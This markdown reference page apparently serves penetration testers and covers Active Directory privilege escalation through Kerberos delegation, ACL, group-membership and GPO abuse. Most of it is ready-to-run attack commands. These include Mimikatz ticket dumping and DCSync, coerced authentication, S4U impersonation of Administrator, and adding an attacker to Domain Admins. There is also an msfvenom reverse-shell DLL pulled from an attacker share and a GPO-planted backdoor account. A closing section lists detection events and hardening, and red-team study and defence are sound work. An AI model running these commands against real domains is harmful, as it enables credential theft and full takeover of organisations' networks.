---
title: Active Directory Privilege Escalation Techniques
category: techniques
subcategory: active-directory
tags: [privilege-escalation, delegation, acl-abuse, gpo, kerberos]
last_updated: 2025-12-27
---

# Active Directory Privilege Escalation Techniques

## Table of Contents

- [Overview](#overview)
- [Delegation Attacks](#delegation-attacks)
  - [Unconstrained Delegation](#unconstrained-delegation)
  - [Constrained Delegation](#constrained-delegation)
  - [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
- [ACL Abuse](#acl-abuse)
- [Group Membership Abuse](#group-membership-abuse)
- [GPO Attacks](#gpo-attacks)
- [Detection and Defense](#detection-and-defense)
- [References](#references)

## Overview

Privilege escalation in Active Directory exploits misconfigurations in delegation, access control lists (ACLs), group memberships, and Group Policy Objects (GPOs) to gain higher privileges.

---

## Delegation Attacks

Kerberos delegation allows services to impersonate users when accessing other services. Misconfigurations create powerful attack vectors.

### Unconstrained Delegation

#### Description

When unconstrained delegation is enabled on a computer, it stores the TGT of any user who authenticates to it. Compromising this computer gives access to all those TGTs.

**Identifying Unconstrained Delegation:**
```powershell
# PowerView
Get-DomainComputer -Unconstrained | select samaccountname, dnshostname

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# LDAP Query
(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))
```

#### Exploitation

**1. Extract TGTs from Memory (if you compromised the server):**
```
# Mimikatz - Dump tickets
privilege::debug
sekurlsa::tickets /export

# Look for high-value TGTs (Domain Admins, etc.)
```

**2. Coerce Authentication (Printer Bug / PetitPotam):**
```bash
# Force DC to authenticate to compromised unconstrained delegation server

# Printer Bug (SpoolSample)
SpoolSample.exe DC01 COMPROMISED_SERVER

# PetitPotam (unauthenticated in some cases)
python3 PetitPotam.py COMPROMISED_SERVER DC01

# Monitor with Rubeus
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

**3. Use Captured TGT:**
```
# Mimikatz - Pass the ticket
kerberos::ptt DC01$@krbtgt-DOMAIN.LOCAL.kirbi

# DCSync
lsadump::dcsync /user:domain\krbtgt
```

---

### Constrained Delegation

#### Description

Constrained delegation limits which services an account can delegate to (specified in `msDS-AllowedToDelegateTo`). However, it can be abused with S4U2Self and S4U2Proxy extensions.

**Identifying Constrained Delegation:**
```powershell
# PowerView
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

#### Exploitation

**Scenario:** User/computer with constrained delegation to a service (e.g., CIFS on DC)

```bash
# Impacket - getST.py
# Get service ticket impersonating admin
getST.py -spn cifs/dc01.domain.local -impersonate Administrator domain.local/svc_sql:password

# With hash
getST.py -spn cifs/dc01.domain.local -impersonate Administrator -hashes :HASH domain.local/svc_sql

# Use the ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dc01.domain.local
```

```powershell
# Rubeus
# Request TGT for constrained delegation account
.\Rubeus.exe asktgt /user:svc_sql /rc4:HASH /outfile:svc_sql.kirbi

# S4U to get service ticket as admin
.\Rubeus.exe s4u /ticket:svc_sql.kirbi /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /ptt
```

**Note:** The service in the ticket can often be changed (alternative service attack):
```powershell
# Change service name (e.g., CIFS -> LDAP for DCSync)
.\Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:Admin /msdsspn:cifs/dc01 /altservice:ldap /ptt
```

---

### Resource-Based Constrained Delegation (RBCD)

#### Description

RBCD is controlled by the target resource via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write to this attribute on a computer, you can make it trust your controlled account for delegation.

**Requirements:**
1. Write access to target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`
2. A computer account you control (or create one if MachineAccountQuota > 0)

#### Exploitation

**Step 1: Create a Computer Account (if needed)**
```bash
# Impacket
addcomputer.py domain.local/user:password -computer-name ATTACKER$ -computer-pass AttackerPass123

# PowerMad.ps1
New-MachineAccount -MachineAccount ATTACKER -Password $(ConvertTo-SecureString 'AttackerPass123' -AsPlainText -Force)
```

**Step 2: Set RBCD on Target**
```powershell
# Get computer account SID
$ComputerSid = Get-DomainComputer ATTACKER -Properties objectsid | Select -Expand objectsid

# Create security descriptor
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Set on target
Set-DomainObject TARGET_COMPUTER -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
```

```bash
# Impacket - rbcd.py
rbcd.py -delegate-to TARGET$ -delegate-from ATTACKER$ -dc-ip DC_IP domain.local/user:password -action write
```

**Step 3: Get Service Ticket and Access Target**
```bash
# Get service ticket
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip DC_IP domain.local/ATTACKER$:AttackerPass123

# Use it
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass TARGET.domain.local
```

```powershell
# Rubeus
.\Rubeus.exe s4u /user:ATTACKER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /ptt
```

---

## ACL Abuse

### Description

Misconfigured Access Control Lists allow privilege escalation by modifying AD objects.

### Dangerous ACL Rights

| Right | Effect |
|-------|--------|
| GenericAll | Full control - modify anything |
| GenericWrite | Modify object attributes |
| WriteOwner | Take ownership of object |
| WriteDACL | Modify object's permissions |
| ForceChangePassword | Reset password without knowing current |
| AddMember | Add members to group |
| Self-Membership | Add yourself to group |

### Finding Abusable ACLs

```powershell
# PowerView - Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# ACLs where you have rights
$sid = (Get-DomainUser currentuser).objectsid
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}

# GenericAll on users
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -like "*GenericAll*" -and $_.ObjectType -eq "user"}

# WriteDACL on groups
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -like "*WriteDacl*"}
```

### Exploitation by Right Type

**GenericAll on User:**
```powershell
# Change password
net user targetuser NewPassword123! /domain

# Or set SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
.\Rubeus.exe kerberoast /user:targetuser

# Or disable preauth for AS-REP Roasting
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
```

**GenericAll on Group:**
```powershell
# Add yourself to group
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# PowerShell AD module
Add-ADGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericAll on Computer:**
```powershell
# RBCD attack (see above)
# Or reset password for local admin access
```

**WriteDACL:**
```powershell
# Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Then add yourself to group
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**WriteOwner:**
```powershell
# Take ownership
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity attacker

# Grant yourself rights
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All
```

**ForceChangePassword:**
```powershell
# Change user's password
$newpass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $newpass

# Or using net user
net user targetuser NewPassword123! /domain
```

---

## Group Membership Abuse

### Description

Certain default and custom groups provide paths to privilege escalation.

### High-Value Groups

| Group | Privileges |
|-------|-----------|
| Domain Admins | Full domain control |
| Enterprise Admins | Full forest control |
| Administrators | Local admin on DCs |
| Account Operators | Create/modify users (non-admin) |
| Backup Operators | Backup any file (extract NTDS.dit) |
| Server Operators | Log on to DCs, manage services |
| Print Operators | Load drivers on DCs |
| DNS Admins | Load arbitrary DLLs on DCs |

### DNS Admins Privilege Escalation

```powershell
# Create malicious DLL (msfvenom)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o evil.dll

# Host on SMB share
# On DC (requires DNS Admins membership)
dnscmd DC01 /config /serverlevelplugindll \\ATTACKER\share\evil.dll

# Restart DNS service (requires Server Operators or similar)
sc \\DC01 stop dns
sc \\DC01 start dns
```

### Backup Operators Privilege Escalation

```powershell
# Use SeBackupPrivilege to copy NTDS.dit
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Also copy SYSTEM hive
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

---

## GPO Attacks

### Description

Group Policy Objects (GPOs) control system configurations. Write access to GPOs linked to computers allows code execution on those computers.

### Finding GPO Permissions

```powershell
# PowerView - Find GPOs with write permissions
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
  ? {$_.ActiveDirectoryRights -like "*Write*"} |
  select ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# GPOs linked to Domain Controllers
Get-DomainGPO -ComputerIdentity DC01
```

### GPO Exploitation Tools

**SharpGPOAbuse:**
```powershell
# Add local admin
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# Add startup script
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net localgroup administrators attacker /add" --GPOName "Vulnerable GPO"

# Immediate scheduled task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Vulnerable GPO"
```

**pyGPOAbuse:**
```bash
# Add local admin
python3 pygpoabuse.py domain.local/user:password -gpo-id "6AC1786C-016F-11D2-945F-00C04fB984F9" -localadmin -user attacker

# Create scheduled task
python3 pygpoabuse.py domain.local/user:password -gpo-id "GPO-GUID" -command "cmd.exe /c net user backdoor Password123! /add"
```

### Force GPO Update

```powershell
# Local update
gpupdate /force

# Remote update (requires permissions)
Invoke-GPUpdate -Computer TARGET -Force
```

---

## Detection and Defense

### Detection

| Attack | Detection Methods |
|--------|------------------|
| Unconstrained Delegation | Monitor TGT requests from non-DC computers |
| Constrained Delegation | Event ID 4769 S4U2Proxy operations |
| RBCD | Changes to msDS-AllowedToActOnBehalfOfOtherIdentity |
| ACL Abuse | Event ID 4662/5136 for object modifications |
| GPO Abuse | Event ID 5136 for GPO changes, 4688 for script execution |

### Key Event IDs

| Event ID | Description |
|----------|-------------|
| 4662 | Operation on directory object |
| 5136 | Directory object modified |
| 4769 | TGS requested (watch for S4U) |
| 4688 | Process creation |
| 4728/4732/4756 | Member added to group |

### Defensive Measures

**Delegation:**
- Audit and minimize unconstrained delegation
- Use constrained delegation with protocol transition disabled
- Add privileged accounts to Protected Users group
- Set `Account is sensitive and cannot be delegated`
- Monitor MachineAccountQuota (set to 0 if possible)

**ACLs:**
- Audit ACLs with BloodHound regularly
- Follow least privilege principle
- Alert on modifications to sensitive objects
- Use AdminSDHolder for protected accounts

**GPOs:**
- Restrict GPO modification rights
- Monitor for GPO changes
- Audit GPO-linked scheduled tasks and scripts
- Sign GPO scripts

```powershell
# Prevent delegation for sensitive accounts
Set-ADAccountControl -Identity sensitiveuser -AccountNotDelegated $true

# Add to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members sensitiveuser

# Set MachineAccountQuota to 0
Set-ADDomain -Identity domain.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

---

## References

- [The Hacker Recipes - Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations/)
- [ired.team - RBCD](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [ired.team - ACL Abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [HackTricks - ACL Persistence](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
- [Synacktiv - GPOddity](https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [Netwrix - RBCD Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
